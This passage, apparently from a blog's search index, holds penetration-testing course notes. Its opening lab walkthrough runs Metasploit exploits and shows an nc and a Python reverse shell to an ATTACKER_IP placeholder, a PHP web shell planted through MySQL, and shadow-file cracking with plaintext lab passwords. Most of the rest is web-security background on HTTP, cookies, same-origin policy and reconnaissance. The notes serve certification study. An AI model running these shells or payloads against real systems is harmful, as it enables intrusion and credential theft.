service listening on a non-standard port of 1999   research on google. Its vulnerable to arbitrary loading of java classes   msf:  use expĺoit/multi/misc/java_rmi_server set options run // we have a shell as todd - a low level user   lets enter in the session  session -i 1 shell uname -a // to grab the kernel version // we can also excute python pty and xterm to get a better shell kernel version: 2.6.24-16   // https://www.exploit-db.com/exploits/21848/ // its potentially vulnerable to a udev exploit   msf in action  use exploi\tt/linux/local/udev_netlink set session 1 set other options run // we have shell with root access   Exploiting Samba server  lets go back as user todd smbd --version   // Samba version: 3.0.20-Debian   // look into the /etc/samba/smb.conf   // We find that its configured with an option that allows reading of the root file system via Symlink Directory Traversal Vulnerability, specifically, the wide links=yes option.      we can use a msf module to exploit that    exploit with msf  msf:  use auxiliary/admin/smb/samba_symlink_traversal set rhost 172.16.80.22 set smbshare tmp run      Now access the following share to browser the root filesystem: \\mercury\\tmp\\rootfs    access the share  smbclient -N \\\\\\\\172.16.80.22\\\\tmp -U \"\"  // we should get access cd rootfs ls cd etc get passwd // its done   Remotely exploitable vulnerability on a web server port.          open the browser on port 80            lets run dirsearch, to find any web directories       ./dirsearch.py -u http://172.16.80.22/ -e cgi -r -f    // -r = recursive // -f = force // -e = extension    /cgi-bin/calender.cgi   msf again  // knowing that CGI programs, in particular, are of primary concern in regards to shellshock vulnerabilities, we use metasploit apache_mod_cgi_bash_env module to check For exploitability, making sure to configure the correct options, including the TARGETURI value:   use auxiliary/scanner/http/apache_mod_cgi_bash_env  set options set targeturi cgi-bin/calendar.cgi set cmd \"/bin/nc &lt;attacker_IP&gt; 1234 -e /bin/sh\"      open a listener and run, we have a shell as www-data    upgrade the shell as usual  python -c 'import pty; pty.spawn(\"/bin/sh\")' export TERM=xterm   search For SUID root executables  find / -perm -4000 2&gt;/dev/null   // we found that nmap is available   nmap --interactive !sh       we have root access    Lab 4 -  Linux Exploitation - Lateral Movement   Netblock: 172.16.80.1/24  Domain: robotstogo.localdomain   Enumerate NFS shares  nmap --script nfs-ls 172.16.80.27   Crack the .zip password  fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt backup.zip       found file notes.txt, (size cp/uc     69/    57, flags 9, chk a1f0)   checking pw KAWANNAT   PASSWORD FOUND!!!!: pw == \"====0open/n\"   open the zip file with the password  unzip -P '====0open/n' backup.zip  \tTEMP MGMT CONSOLE: \thttps://172.16.80.24:4433/xl0827_dev_    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;ATTACKER_IP&gt;\",&lt;ATTACKER_PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'    username=tomcatadmin&amp;pw=0x19$2B7! amanda: M@ndy857#   Find SUID files     we can execute catme as root   so we will copy the /etc/passwd and /etc/shadow to our machine   cracking  unshadow passwd shadow &gt; forJohn john forJohn -w=/usr/share/wordlists/rockyou.txt james:159357 damien:secuirty3      btw, rockyou did not have this password, thats a bold move ma boi my fasttrack is not working, so i could not crack with rockyou    // now we can log into 172.61.80.27 via SSH with damien access // damien has root access, so with a simple sudo bash we are root   cat /home/auditor/.bash_history run autoroute -s 192.3.178.0/24 portfwd add -l 1234 -p 80 -r 192.3.178.3 portfwd list mysql -h 192.3.178.3 -u root -pfArFLP29UySm4bZj SELECT '&lt;?php echo system($_GET[\"cmd\"]); ?&gt;' into DUMPFILE '/var/www/html/webtemp/backdoor.php';   → http://localhost:1234/webtemp/backdoor.php?cmd=whoami   ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","linux"],
        "url": "/notes/ecppt/linux/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser5.jpg"
      },{
        "title": "5 - Web App Security",
        "excerpt":"  Introduction      This module contains the required background information you will need before you begin your web application security testing   HTTP - Hypertext Transfer Protocol     its a client-server protocol used to transfer web pages and web application data. The client is usually a web browser that starts a connection to a web server such as an MS IIS or Apache HTTP Server.   HTTP Request Headers  // the connection to www.google.com on port 80 is initiated before sending HTTP commands to the webserver     The content of the request that we send when we open out web browser and navigate to google   Get / HTTP/1.1 Host: www.google.com User-Agent: Mozilla/5.0 ... Accept: text/html, application/xhtml+xml Accept-Encoding: gzip, deflate Connection: keep-alive   Line by Line Explanation     Get - its the default request type (also known as an HTTP Verb) // other options: POST, PUT, DELETE, TRACE…   the / is the home page of website   the HTTP/1.1 is the http protocol version that your browser wants to talk with.   Host = the host header allows a web server to host multiple websites on a single IP address.   after each request header, you will find its corresponding value. In this case www.google.com   User-Agent = reveals your browser version, operating system and language to the remote web server.   Accept = its a header used by your browser to specify which document type is expected to be returned as a result.   Accept-Encoding = similar to Accept, but it restricts the content codings that are acceptable in the response. Content codings are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information.   keep-alive = indicates that all requests to the web server will continue to be sent through this connection without initiating a new connection every time (as in HTTP 1.0).      now lets inspect the webserver response    HTTP Response  HTTP/1.1 200 ok Date: Fri, 13 mar 2015 ... Cache-Control: private, max-age=0 Content-Type: text/html; charset=UTF-8 Content-Encoding: gzip Server: gws Content-Length: 258 &lt; PAGE CONTENT&gt;   Line by Line explanation     The first line is the Status-Line, consisting of the protocol version (HTTP 1.1) followed by a numeric status code (200) ans its relative textual meaning (OK)   200 OK  301 Moved Permanently (assigned a new permanent URL  302 Found (temporarly under another URL 403 Forbidden (client does not have enough privileges and the server refuses to fulfill the request.) 404 Not Found (server cannot find a resource matching the request) 500 Internal Server Error (server does not support the functionality required to fulfill the request)      Date = represents the date and time at which the message was originated   Cache headers allow the Browser and the Server to agree about caching rules. Cached content save bandwidth, because in short, they prevent your browser from re-requesting content that has not changed.   Content-Type = lets the client know how to interpret the body of the message   Content-Encoding = extends Content-Type; In this case the message body is compressed with gzip.   Server = displays the Web Server banner. Apache and IIS are common web servers. Google uses a custom webserver banner: gws ( Google Web Server )        Content-Length = indicates the length in bytes of the message body       →  moreover = http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.1       HTTP Header Field Definitions  To inspect the HTTP headers in web browsers: Firefox: \t1. options menu \t2. Developer &gt; Network      by selecting any request or response from the list, a new panel appears on the right and we are able to inspect information such as headers, cookies, parameters and so on.   HTTPS     HTTP content, as in every clear-text protocol, can be easily intercepted or mangled by an attacker on the way to its destination. Moreover, HTTP does not provide strong authentication between the two communicating parties.   HTTP Secure (HTTPS) or HTTP over SSL/TLS is a method to run HTTP, which is a clear-text protocol, over SSL/TLS, a cryptographic protocol.   This layering technique provides confidentiality, integrity protection and authentication to the HTTP protocol.   In other words:   An attacker on the path cannot sniff the application layer communication   An attacker on the path cannot alter the application layer data   The client can tell the real identity of the server and, sometimes vice-versa.      The extra encryption layer protects data exchanged between the client and the server. It does not protect from an attack against the application itself. Attacks such as XSS and SQL injections will still work.    Encoding     Often invisible to end users, occurs each time an application needs to process any data.   Charset     A charset consists of pairs of symbols and code points.   The symbol is what user reads, as he sees it on the screen. The code point is a numeric index, used to distinguish, unambiguously, the symbol within the charset. A symbol can be shown only if it exists on the charset.   Example:   ASCII Unicode Latin-1 and so on.   ASCII     American Standard Code For Information Interchange contains a small set of symbols.   total of 255. its old, it was designed to support only US symbols.        For example, ASCII cannot be used to display Chinese symbols, among many others.       Complete list: http://www.ascii-code.com/   Unicode     Universal Charecter Set   it supports all the worlds writing systems.   → Complete list: http://unicode-table.com/en/#0032   Character encoding     Is the representation in bytes of the symbols of a charset: a mapping of the symbols to a series of ordered bytes so that your data can get to you.   A symbol can be represented by using one or more bytes.   Unicode Encoding     Unicode has three main types of implementation of character encoding: UTF-8, UTF-16 and UTF-32, where UTF stands For Unicode Transformation Format.   8,16 and 32 are the amount of bits used to represents code points.   HTML Encoding     There is two main issues to address:   Inform the user agent on which character encoding is going to be used in the document, and preserve the real meaning of some characters that have special significance.   Documents transmitted via HTTP can send a charset parameter in the header to specify the character encoding of the document sent.   If not defined, the default is Latin-1.   If the charset is set incorrenctly, it may not display some symbols.   HTML Entities     In HTML, There are many characters (symbols) with special meanings.   Example: &lt;&gt; means the start and end of a HTML tag.      If you want o show that in the browser, you want to avoid the symbols of being interpreted. Then, its necessary to use the related entities.   HTML entity its a string that correponds with a symbol. It start with &amp; or &amp;# and ends with ;   // There is multiple ways to represent character references:                  Char Reference       Rule       Encoded Char                 Named Entity       ** &amp; + named char references + ; **       &amp;It;                 Numeric Decimal       ** &amp; + # + D + ; **       &#60;                 Numeric Hexa       ** &amp; + #x + H +; **       &#x3c; / &amp;#X3C;              Although the primary purpose of HTML entities is not to be a security feature, its use can limit most client side attacks (IE: XSS).    URL Encoding (Percent encoding)     URLs sent over the internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding them is required.   This encoding is important because it limits the characters to be used in a URL to a subset of specific characters:   1. Unreserved Chars: [a-zA-Z] [0-9] [-._~] 2. Reserved Chards: :/?#[]!$\"\"()*+,;=% (they have a specific purpose)      Others chars are encoded by the use of a percent char (%) plus two hexadecimal digits.       Common encoded characters:                  Char       Purpose in URL       Encoding                 #       Separate anchors       %23                 ?       Separate query string       %3F                 &amp;       Separate query elements       %24                 +       indicates a space       %2B              When you visit a site, URL-encoding is performed automatically by your browser. This happens behind the scenes of your browser while you surf. → http://www.w3schools.com/tags/ref_urlencode.asp      Generally, web browser (and other client-side components) automatically perform URL-encoding, and if a server-side script engine is present, it will automatically perform URL-decoding.    Base64     its a binary-to-text encoding schema used to convert binary files and send them over Internet.   The HTML language permits the inclusion of some resources by using this encoding.   Base64 is composed of [0-9] [a-zA-Z] [ * / ]  and (=) used For padding   Same Origin Policy (SOP)     This policy prevents a script or a document from getting or setting properties of another document that comes from a different origin.   Note: CSS stylesheets, images and scripts are loaded by the browser without consulting the policy.   SOP is consulted when cross-site HTTP requests are initiated from within client side scripts (IE: JavaScript), or when an Ajax request is run.   The origin is defined by: Protocol - Host - Port        example: http://www.teste.site       // protocol = http   // host = teste.site   // in this example, site is the top-level domain (TLD)   // the teste is the second-level domain (SLD) = subdomain of site   // www is the third level domain = subdomain of teste   // and so on   // port = 80, when not specified, the default port is always 80      The primary purpose of SOP is to isolate requests coming from differente origins.       Internet Explorer does not consider the port as a component to the SOP The SOP is not applied to domains that are in highly trusted zone (i.e corporate domains)    Main Rule of SOP     A document can access (through JavaScript) the properties of another document only if they have the same origin   More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.   Images, .css, .js are excluded from the previous statement; they are always accessible regardless their origin, and the browser loads them without consulting SOP.   4 Exceptions to SOP restrictions  Window.location:     A document can always write the location property of another document.   The window.Location object can be used to get the current page address and to redirect the browser to a new page.   the location property can always be changed. But its the SOP that determines whether a new document can be loaded.        A doc can always update the location property of another document, if they have some relationship.       if a document is embedded within another via an iframe element,   if one document is opened by the other via the window.open DOM API.   Document.domain:     related to the DOM property   This property describes the domain portion of the origin of the current document.   by changing the document.domain property, a document slightly changes its own origin.   imagine two diferents origins of the domain a.teste.site and b.teste.site   the JavaScript cant access the main document cause the origin is differente (SOP rule)   but if both subdomains run the (document.domain =”teste.site”), now they can run JavaScript, because its considered that they have the same origin   Cross Window Messaging     The new HTML5 feature permits different documents (iframes, popups, and current window) to communicate with each other regardless of the SOP by using a simple synchronus mechanism.   Cross Origin Resource Sharing     its a set of specs built to allow a browser to access a few resources by bypassing the same origin policy (SOP). The CORS architecture uses custom HTTP response headers and relies upon server-side components or server-side scripting languages.   This also will be dealt with in-depth in the HTML5 module.   Cookies     HTTP itself is a stateless protocol. This means that a website cannot retain the state of your visit between different HTTP request without mechanisms such as sessions or cookies. To the server, each visit, without a session or a cookie, looks like a new user.   So cookie were invented to make HTTP stateful.   Cookies are textual information installed by a website into a ‘cookie jar’ of the web browser.   There are fragments of text containing variables in the form of name=value.   A server can set a cookie via the Set-Cookie and has this format:   domain expires / path content / http only flag / secure flag   Domain: \tThe browser will install the cookie in the cookie jar and will send this cookie For any subsequent request to any subdomain. example: google.com / www.google.com / maps.google.com \tThe scope of this cookie will be ‘*.google.com’ \t- A leading ., if present is ignored \t- if the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookies host-only flag. This means that the cookie will be sent only to that precise hostname.   Expires:  \tGives the cookie a time constraint. THe cookie will only be sent to the server if it has not expired. \tSession cookies expire when the session exits.   Path:  \tspecifies For which requests, within that domain, the browser needs to send the cookie. \texample: path=/downloads           /downloads            /downloads/foo            /downloads/foo/bar       The browser will not send this cookie For request to /blog or /members etc   Content:  \tA cookie can carry a number of values at once. with KEY=Value pairs. \texample: \t- Set-Cookie: Username=”john”; Authenticated=”1”   HttpOnly Flag:  \tIs used to force the browser to send the cookie only through HTTP. \tThis flag prevents the cookie from being read via JavaScript, Flash, Java or any other non-HTML technology; This protection mechanism against cookie stealing via XSS.   Segure Flag:  \tForces the browser to send the cookie only through HTTPS (SSL); \tThis prevents the cookie from being sent in clear text.   Cookie Domain     Together with the path, secure and expires attributes, its useful during the process in determining if a cookie must be submitted along with a new HTTP request.   moreover = http://tools.ietf.org/html/rfc6265   As opposed to the previous RFC, the leading dot (.) has no particular significance.   example: .teste.site / teste.site   Specified Cookie Domain     A cookie with a domain value specified will be sent by the browser when one of the following conditions occurs:   Cookie domain value = Target domain   Cookie domain value is different from the target domain and Cookie domain value is a suffix of the target domain.      lower-level subdomain can set cookies For higher domains. So, b.a.teste.site can set a cookie For a.teste.site or teste.site   On the other hand, higher domains cannot set cookie For lower-level subdomains; Meaning, teste.site cannot set cookies For any.teste.site   Unspecified cookie Domain     When a cookie does not contain a domain value, its assumed that the host-only-flag is set to true.   A cookie set with host-only flag will be sent only to the target domain.   RFC used the term host instead of domain        If a page on the target domain teste.site sets a cookie without the domain value, the browser will send this cookie only in HTTP requests that exactly match the following URLs:       http[s]://teste.site/*       Internet Explorer Exception     Internet Explorer does not distinguish between cookie with a specified domain value and ones with unspecified values.   Cookies with unspecified domain values will be interpreted by the browser as if they had a domain value corresponding to the target domain set in it.   Example:   A page on the target domain teste.site sets a cookie without a domain value. IE differs from other browsers, and will consider sending this cookie as if its domain value was set to teste.site therefore, it will send this cookie in HTTP requests that match the following:   http[s]://*.teste.site/*   Inspecting the Cookie Protocol   Login:   A login page is a great place For a session to begin and also a good point at which a cookie is installed in your browser. Web Browser &gt; www.google.com   POST /login.php Host: www.google.com  usr=John&amp;Pass=mypass   Set-Cookie:   The website responds with a Set-Cookie response header. This header contains the cookie to be installed in the browser and to be included in all subsequent requests to www.google.com \tWeb Browser &lt; www.google.com   HTTP /1.1 200OK ... Set-Cookie: domain=google.com; path=/; expires=espires=Mon; 16-Apr-2013 19:03:22 GMT; authenticated='1'; httponly; secure; &lt;PAGE CONTENT&gt;   Cookie:   For every subsequent request, the browser will consider: Domain scope, Path, Expiration, Flags. If all the above checks out, a cookie header that contains the cookie will be inserted into the Request Header.   Web Browser &lt; www.google.com   GET /mail.php Host: www.google.com Cookie=authenticated=\"1\";   Session     Sometimes the web developer prefers to store information on the server side instead of the client side.   This happens in order to hide the application logic or just to avoid the back and forth data transmission, which is the typical behavior of cookies.   HTTP sessions are a simple mechanism that allows websites to store variables, specific For a given visit, on the server side.   Each user session is identified by either a session ID or token, which the server assigns to the client.   Cookie = stores on the client   Session = stores on the server        Usually session expires sooner than cookies do.            The session mechanism works through the use of a session token (or session ID)       → The session ID is assigned to the client by the webserver       → The client will present this ID For each subsequent request in order to be recognized       The session ID is like a primary key in a relational database where clients variables are stored.   Sessions IDs can be stored within text files, databases or memory on the server.   Session Cookies contain a single parameter formatted in a key value pair.  SESSION=&lt;number&gt; PHPSESSID=&lt;number&gt; JSESSIONID=&lt;number&gt;           Websites running PHP, typically install session cookies by using PHPSESSID parameter name while JSP websites use JSESSIONID;       each development language has its own default session parameter name and typically allow For developers to customize its functionality (ie: changing PHPSESSID to PSESSID)        Server can install session cookies after a browser performs some type of activity, such as:   Opening a specific page.   Changing settings in the web application   Logging in       The client uses a login form to POST the users credentials   The server sends back a response with a Set-Cookie header field. The cookie contains the session ID        The browser will send back the cookie according to the cookie protocol, thus sending the session ID       Since the web browser has a cookie in its jar, any subsequent request will carry the session cookie with it.   As an alternative to session cookies, session IDs can also be sent via the GET method appended to the requesting URL.   Web Application Proxies      An intercepting proxy is a tool that lets you analyze and modify any request and any response exchanged between an HTTP client and a server.   By intercepting HTTP messages a pentester can study a web application behavior and manually test For vulnerabilities.        The most common web application proxies are:       → Burp Suite = http://portswigger.net/burp/download.html       → Zap       Burp:  Intercept requests and responses between your browser and the web server Build requests manually Crawl a website, by automatically visiting every page in a website Fuzz web applications, by sending patterns of valid and invalid inputs to test their behavior To run on another operating system:   java -jar burpsuite_free_v1.6.jar      Set the proxy and port in both burp and browser   You can check what Burp has collected in two ways:   on the Proxy &gt; History tab in the Target &gt; Site Map tab   Information Gathering   Gather Information on Your Targets     Information Gathering is the very first and most critical step of every penetration test   Most pentesting jobs are black-box tests (external)        Everything you collect should be noted For future use. It will become useful in both understanding application logic and during the attack phase.       What sorts of information are we going after?   Infrastructure (Web Server, CMS, Database, ...) Application Logic IPs, Domains and Subdomains VIrtual Hosts   Finding Owner, IP Addresses and Emails     The first step of information gathering usually starts aways from the orgnizations network. It begins with their electronic footprint, not just of their employees, but also of their network and websites.   WHOIS     The Whois database contains public information, so you can freely check it.   its used to look up domain ownership details from differents databases. Normally runs on TCP port 43.   Can be used in *nix or Windows via SysInternal : http://technet.microsoft.com/en-us/sysinternals/bb897435.aspx   →  Also via web: http://whois.domaintools.com/   DNS     Domain Name System. We can query it For some of the IP addresses that we received from the WHOIS database.   The DNS structure contains a hierarchy of names. The root, or highest level of the system is unnamed.   Top Level Domains (TLDs) are divided into classes based on rules that have evolved over time. Most TLDs have been delefated to individual country managers, whose codes are assigned from a table known as ISO-3166-1. These are maintained by an agency of the United Nations and are called country-code Top Level Domains, or ccTLDs. (ex: .us, .uk, .il, .de, .fi, .fr, .br)        In addition, there are a limited number of generic Top Level Domains (gTLDs) which do not have a geographic or country designation. (ex: .com, .org, .net, .gov, .edu)       DNS queries produce listing called Resource Records.   Resource Record TTL / Record Class SOA / NS / A / PTR / CNAME / MX      Resource record starts with a domain name, usually a fully qualified domain name. If anything other than a fully qualified domain name is used, the name of the zone the record is in, will automatically be appended to the end of the name.   TTL (Time-To-Live), in seconds, defaults to the minimum value determined in the SOA record.   Record Class - Internet, Hesiod, or Chaos   SOA (Start of Authority) indicates the beggining of a zone and it should occur first in a zone file. There can be only one SOA record per zone. It defines certain values For the zone such as a serial number and various expiration timeouts.   NS (Name Server) Defines an authoritative name server For a zone. It defines and delegates authority to a name server For a child zone. NS Records are the GLUE that binds the distributed database together.   A (Address). The A record simply maps a hostname to an IP address. Zones with A records are called forward zones.   PTR (Pointer). The PTR record maps an IP address to a Hostname. Zones with PTR records are called reverse zones.   CNAME record maps an alias hostname to an A record hostname.        MX (Mail Exchange). The MX record specifies a host that will accept email on behalf of a given host. The specified host has an associated priority value. A single host may have multiple MX records. The records For a specific host make up a prioritized list.       The domain name system (DNS) is a distributed database arranged hierarchically. Its purpose is to provide a layer of abstraction between Internet services (web, email, etc.) and the numeric addresses (IP addresses) used to uniquely identify any given machine on the Internet.            It permits the use of names instead of numbers to identify hosts       Names are easier to remember       It permits a server to change numeric addresses without requiring notification of everyone on the Internet, by simply pointing the name to the new numeric address.       One name can refer to multiple hosts, to share the load.           NSLOOKUP          it lets you translate hostnames to IP addresses and vice versa.            Reverse Lookup   AKA A.   If you provide a domain name, DNS returns the IP addresses For the matching hosts.       nslookup -type=PTR &lt;ip&gt;      Records   it will query the DNS server For the whole record associated with google.com   (name servers, cnames, A records, and MX)   nslookup -querytype=ANY google.com      An organization can purchase a block of IP addresses according to their needs and it will own that entire block.   The WHOIS database tracks the owners of public IP addresses as well as domains names.   Sometimes, organizations are not actually the owners of the IP addresses they use For their presence on the internet. They may rely on ISPs and hosting companies that lease one or more smaller netblocks.   Finding the netblock owner and the ISPs that our target organization relies on, is an important step that we will study.   Finding Target ISP’s     We want to know which ISPs hosting and IP addresses our target uses.   Using nslookup we get the IP addresses associated to each subdomain. We will perform a whois request For each of these IP addresses to uncover the ISPs that these IP addresses belong to.   note: When the organization is big, net-blocks may be assigned directly to it, so no Hosting services are involved.   note2: A corporation is not limited to having only one hosting company.   Step 1 - nslookup     The first step is to gather all the IP addresses related to a domain or subdomain.   nslookup statcounter.com  // store these two IP addresses      Continuing to perform a per-subdomain ip survey, we move on to www.statcounter.com.   nslookup www.statcounter.com  // store the new IP addresses      we can continue this survey against all of the organizations domains and subdomains.  For now we will stop and start our ISP recognition phase.    Step 2 - whois     We will uncover the ISPs that our organization relies upon.   → http://whois.arin.net/rest/net/NET-108-162-192-0-1/pft   → http://whois.domaintools.com/   → https://apps.db.ripe.net/search/query.html   // start querying the IP addresses we have. // grab the organization name, netblock, other information that you found useful // At the end of this process, we can build a table with all the IP addresses used by the organization and  the ISP/Hosting services that these IP addresses belong to.      To perform a thorough pentest, this information must be included in your penetration testing documentation. This information will become useful when mapping the attack surface.    NetCraft     A faster way to uncover the organization hosting scheme and ownership is by using NetCraft.   Netcraft has a wealth of information For us and we will use it often in this module.   →  http://www.netcraft.com/   Infrastructure     The infrastructure behind a web application is what supports it and allows it to function.   This includes the web server that is directly involved in the execution of any web application.        The two most common web servers used on the internet today are Apache and Microsoft IIS.       Discovering an IIS (Internet Information Service) web server will tip us off that the server is running an OS in the Windows Server OS family.   IIS version 6.0 is installed by default on all Windows Server 2003 boxes, Windows server 2008 supports IIS 7 and Windows Server 2012 is the only one to support IIS 8.0.   However, Linux may run different versions of the Apache Web Server.   Fingerprinting The Webserver     IIS components, usually called ISAPI extensions, work as dynamic libraries, extending the functionalities of the web server and performing different tasks For the web server.   → These include: URL rewriting, load balancing, script engines (like PHP, Python or Perl) and many others.           IDS is a web application firewall that detects and prevents intrusions coming from the HTTP/S protocol.       via HTTP request, sometimes we receive the server name and version in the response   For the version we can use NetCraft.   Netcraft its very useful not only For this web server fingerprinting step but also, For subsequent steps like collecting all available subdomains For a domain.   Its not uncommon to find corporations or even small businesses using load balancers that route HTTP request to different servers that may even run different web server versions.   The advice here is to take note of all web server version-to-IP couplets For further use.   nslookup -type=NS microsoft.com      The nameserver is the DNS server that replies to all lookup queries regarding the namespace of a domain.   In addition to web server version, IP addresses and Nameservers, Netcraft provides the following information we can capture:   Server version Uptime stats IP address owner Host provider      There are cases where Netcraft cannot be used, such as with internal web servers that are not attached to internet.   In this case we can use manual testing techniques:   netcat httprint whatweb - https://github.com/urbanadventurer/WhatWeb wappalyzer - https://wappalyzer.com/   Netcat  By using Netcat we can establish a connection to the Web Server and look at the Server field in the HTTP response header:  nc 192.168.102.136 80 HEAD / HTTP/1.0           First establish the connection, then we have to send HEAD / HTTP/1.0 // From the response we can see that we are running Apache version 2.2.22 on Linux OS            Beyond the Server header we should also look at the X-Powered-By header, which may reveal the technology behind the Web Application. // Possible values:       ASP.NET PHP, JSP JBoss etc      We can potentially guess the web server by inspecting the cookie header. Here is a short list of what you may encounter:   PHP = PHPSESSID=xxxxx .NET = ASPSESSIONIDYYYY=xxxxx JAVA = JSESSION=xxxxx      There may be many different result outputs depending on the service running on the machine, the version, Operating System and so on.   More examples here:   → https://www.owasp.org/index.php/Testing_for_Web_Application_Fingerprint_(OWASP-IG-004)   → https://www.owasp.org/index.php/Fingerprint_Web_Application_Framework_(OTG-INFO-008)   WhatWeb  → https://github.com/urbanadventurer/WhatWeb      Tool that can be used to recognize website technologies, web server versions, blogging platforms, JavaScript libraries and much more.   whatweb -v &lt;url&gt;   Wappalyzer  → https://wappalyzer.com/download     Its a Firefox/Chrome extension, we can use directly from the browser   Fingerprinting Webserver Modules     Modules we are looking For are ISAPI modules (For IIS) or Apache modules that may interfere with or alter our test results.   When a user requests read_doc.php?id=100 the server side module om charge of translating the URL will use regular expressions to match a Rewrite rule and will translate the URL according to the rules specified by the administrator.   URL rewriting is done on Apache with the mod_rewrite module or .htaccess   On IIS it is handled by Ionic Isapi Rewrite or Helicon Isapi Rewrite        Its easy to recognize, and we can attempt input validation attacks       Not having the real URL, and only the rewritten URL, will make it much more difficult For a pentester to try these attacks on URLs. However, still be possible to carry malformed payload using other input channels such as: forms, cookies and headers.   Input validation attacks are still possible if you can reverse-engineer the translation rules.   Enumerating Subdomains     The enumeration starts by mapping all available subdomains within a domain name.   There are lots of ways to enumerate subdomains:   Netcraft Google Crawling / Brute Force Tools Zone transfers   Netcraft = http://searchdns.netcraft.com/     In order to list all the subdomains of a specific target we need to select subdomain matches from the dropdown menu and type in our string:   *.domain.com      To get more information, just lick on the Site Report icon.    Google     http://www.googleguide.com/advanced_operators_reference.html   site:.domain.com site:.domain.com -inurl:www. or site:.domain.com -site:www.domain.com      Now we can continue tweaking our search query by removing the new subdomains found. So we will keep adding -site or -inurl until we find all the subdomains:   site:.domain.com -site:subdomain1.www.domain.com -site:subdomain2.domain.com -inurl:subdomain3.domain.com   Tools     dnsrecon = https://github.com/darkoperator/dnsrecon   subbrute = https://github.com/TheRook/subbrute   fierce = https://github.com/davidpepper/fierce-domain-scanner   nmap = http://nmap.org/book/man-host-discovery.html   dnsenum = https://code.google.com/p/dnsenum/downloads/list   knock = https://github.com/guelfoweb/knock   theHarvester = https://github.com/laramies/theHarvester   recon-ng = https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide   Examples:  python subbrute.py microsoft.com python subbrute.py -h -s &lt;wordlist of your choice&gt;  dnsrecon -d microsoft.com -g -g = perform Google enumeration  theharvester -d microsoft.com -b google -l 200 -f /root/Desktop/msresults.html -d = domain // -l = limit the results // -b = data source (bing, google, linkedin, pgp, all, etc) -f = output to HTML or XML file theharvester -d domain.com -b linkedin -l 200   Zone Transfer     A zone transfer is the term used to refer to the process by which the contents of a DNS Zone file are copied from a primary DNS server to a secondary DNS server   Zone Transfers are usually the result of a misconfiguration of the remote DNS server. They should be enabled (if required) only For trusted IP addresses.   Windows:  nslookup -type=NS domain.com nslookup &gt; ls -d domain.com    Linux:  dig @nameserver axfr domain.com  nameserver is a nameserver For domain.com axfr is the mnemonic opcode For the DNS zone transfer   Finding Virtual Hosts     A virtual host is simply a website that shares an IP address with one or more other virtual hosts.   These hosts are domain and subdomains   This is very common is a shared hosting environment where a multitude of websites share the same server/IP address   fierce -dns domain.com      keep track of your tracks with a mind map    Fingerprint Frameworks and Applications      Once we have a list of subdomains, we will apply the techniques that follow in this module to all of them.   We will basically start looking at the webpages running on each of the subdomains we have found.   Common applications may be:   Forums (like phpBB, vBulletin) CMSs (like Joomla or Drupal) CRMs, blogging platforms (like WordPress or Movable types) social networking scripts and a number of other applications      Web scripts are available online at sites like: http://www.hotscripts.com/   Almost all of these frelly available applications suffered from some kind of vulnerability in their history   We need the exact version in order to look For a working exploit online.   Sometimes its as easy as looking For the applications name in the web page content   In other cases, we need to look at the web page source; the name and version is usually included in HTML comments or even in the HTTP headers.        Just using Telnet, Burp suite, web browsers or any other way that will let us read the raw response, headers will reveal useful information about the website; this includes the CMS running on it.       Moreover, remember that response headers may give other valuable information such as PHP version, exact web server version and modules installed.        We may need to read the web page source code and look For information in the META tags and in HTML comments.       CMSs are available online For free or licensed commercially. like Joomla, Drupal or Mambo   The Add-ons of these applications are usually poorly coded and contain vulnerabilities   While the core parts of these projects are usually built following the best practices of secure coding, thousands of free-to-use extensions are coded by amateurs, and most of the time, these are affected by many different web application vulnerabilities.   example: Joomla URLs consist of 3 main parts:   index.php?option=%component_name%&amp;task=%task_value%   // index.php os the only script you will ever see on Joomla. Its in charge of loading the specified component passed in, via the option parameter. // More tasks and arguments are passed to that component with subsequent parameters.     Docman, document manager component:   index.php?option=com_docman&amp;task=doc_view&amp;gid=100  // Here we are loading the Docman add-on, declaring that we want to view the document with id=100.      In our Information Gathering process, we will not only list all the common applications in use, but also, all the third party add-ons in use in that application. These will likely be useful For our penetration tasks later on.    Firgerprinting Custom Applications     Our first step in this case will be to consider the overall scope of the application:   What is it For? Does it allow user registration? Does it have an administration panel? Does it take input from the user? What kind of input? Does it accept file uploads? Does it use JavaScript or Ajax or Flash? And so on.      These questions can be answered by just visiting the website and taking notes of anything we come across in the process.            Spidering (or crawling) the application is addressed at a later stage, but valuable in this case.            Browser the application with a proxy in the middle of our requests, collecting all the headers and responses.          We can use Burp to do that.    Creating A Funciontla Graph      Advice: Study the whole target behavior, then split the tests in smaller tasks and take care of each one.    Study the target  in this phase you would use the web browser to study the target under the behavioral point of view. No technical analysis is involved. This purpose of this phase is to recognize the blocks by which the target website is made of.      The following questions should help guide you:   What is the purpose of the website/web application?   - Sell online?  - Corporate online presence?  - Blogging?   What seems to be the core of the website?   - Selling products?  - Do they sell memberships? digital contents?   Does it require a login to perform certain actions?   What are the main areas of the website?  - Blogs?   eCommerce area?   Study the Blocks     Now we will repeat our process For each block more closely   Any block uses a third-party application (we will change the shape of the block if so and note the kind of application)   Any block can only be accessed through the login (we will create a first path using arrows)   Functional Graph     The goal of the functional Graph is to visually spot important information at a glance.        We will use this functional graph as a basis For further charting of our information and prepare it For the testing part.       For each smaller part of the application, we will add notes and comments including (but not limited to):   Client side logic (usually JavaScript code in use)   Flash applications   cookies (a new cookie may be set when browsing this area of the website)   authorization required   forms and so on   Mapping the Attack Surface     The attack surface is the area of the application in which we will focus all of our security testing efforts.   The more we know about our target web application, the wider the attack surface will be.   Use the suggested graphing techniques or create one you are comfortable with and stick with it.   Client Side Validation     User submitted data through web forms can be validated on the client side, server side or both.   Recognizing where the validation occurs will allow us to manipulate the input in order to mount our input validation attacks like SQL injection, XSS or general logical flaws.   We can reveal the presence of client side validation by inspecting the web page source code and looking at the JavaScript functions triggered upon form submittal.   We can use firebug to inspect the web page source code.   Database 